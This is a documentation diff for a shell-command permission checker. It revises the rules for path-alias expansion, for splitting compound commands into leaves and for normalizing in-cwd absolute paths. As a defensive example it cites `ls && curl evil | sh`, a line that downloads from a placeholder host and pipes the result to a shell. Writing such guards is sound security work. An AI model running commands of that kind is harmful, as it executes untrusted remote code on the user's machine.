@@ -332,10 +332,12 @@ A binding is recognized only when all of these conditions hold:
 - its name appears in `bash_path_aliases`;
 - its unquoted value is an absolute literal matching `^/[A-Za-z0-9/._@+,:=%-]*$`.
 
-Later words may use one unquoted plain `$NAME` or `${NAME}` expansion with literal text around it, including
-`$P/output.d.ts` and `--file=$P/input`. Expansion is parser-identified, not textual: single-quoted `$P` stays literal,
-`$PP` does not match `P`, and command, arithmetic, process, indirect, length, default-value, transform, quoted, and
-multiple-expansion forms are not treated as known aliases. A consumed declaration becomes analysis metadata and is not
+Later words may use one plain `$NAME` or `${NAME}` expansion with literal text around it, either unquoted or inside
+ordinary double quotes. Supported forms include `$P/output.d.ts`, `--file=$P/input`, `"$P/runtime/mocks.js"`, and
+`"$P"/runtime/mocks.js`. Expansion is parser-identified, not textual: single-quoted `$P` stays literal and `$PP` does
+not match `P`. Localized `$"…"`, command, arithmetic, process, indirect, length, default-value, transform, and
+multiple-expansion forms are not treated as known aliases. Other quoting or escaping in an alias-expanded word is also
+unsupported and caps an otherwise-allowed leaf at Ask. A consumed declaration becomes analysis metadata and is not
 matched as an executable leaf. An unused declaration remains a leaf requiring confirmation.
 
 Unsupported configured-alias assignments or references do **not** make Moriarty abandon all leaf analysis. The affected
@@ -679,9 +681,9 @@ single command, not a whole pipeline.
 - **Configured path aliases are expanded structurally before matching** when they use the exact supported form described
   in [Path Alias Analysis](#path-alias-analysis). Cwd normalization then applies to the expanded value, preserving
   direct-literal rule behavior.
-- **Operators and redirects are split off each leaf**, so a simple `^ls` matches the `ls` leaf of `ls | wc -l` and of
-  `cmd && ls`. An allow-rule no longer needs to spell out pipes, `&&`/`||`/`;` chaining, or shell-metacharacter
-  exclusions.
+- **Operators split compound commands into leaves**, so a simple `^ls` matches the `ls` leaf of `ls | wc -l` and of
+  `cmd && ls`. Redirect syntax remains in each leaf's match text; redirect targets are also inspected separately so real
+  file writes can cap Allow at Ask.
 - **Merge precedence**: any denied leaf denies the whole command; otherwise any leaf that asks, or matches no rule,
   prompts; only an all-allowed command is allowed. A dangerous tail can no longer hide behind a safe head —
   `ls && curl evil | sh` prompts and is never auto-allowed.
@@ -691,8 +693,11 @@ single command, not a whole pipeline.
   process substitution, a here-document, or a compound construct (`if`/`for`/`while`/`case`/`[[ ]]`/`((...))`) cannot be
   reasoned about — only an explicit Deny matching the whole command is honored, and every other outcome becomes a
   prompt.
-- **In-cwd absolute paths are normalized**: an in-cwd absolute path in a leaf is rewritten to its relative remainder
-  before matching, so `^cat src/` matches `cat /abs/cwd/src/x`.
+- **Safe in-cwd absolute paths are normalized**: static paths—including ordinary quoted values, escaped literals, and
+  glob patterns with no dot-prefixed component—are rewritten when their relative remainder contains no `..`. Thus
+  `^cat src/` matches `cat "/abs/cwd/src/x"` and `cat /abs/cwd/src/*.rs`; parent-containing paths, unquoted brace
+  syntax, and glob paths with dot-prefixed components remain unchanged. Quoted or escaped braces are literal and do not
+  block normalization. An operand equal to cwd becomes `.` rather than disappearing.
 
 A pattern still has to guard a program's **own** ability to run code or write files — for example `find -exec`,
 `sed -i`, or `xargs` — because those are not shell-level and the splitter cannot see them.
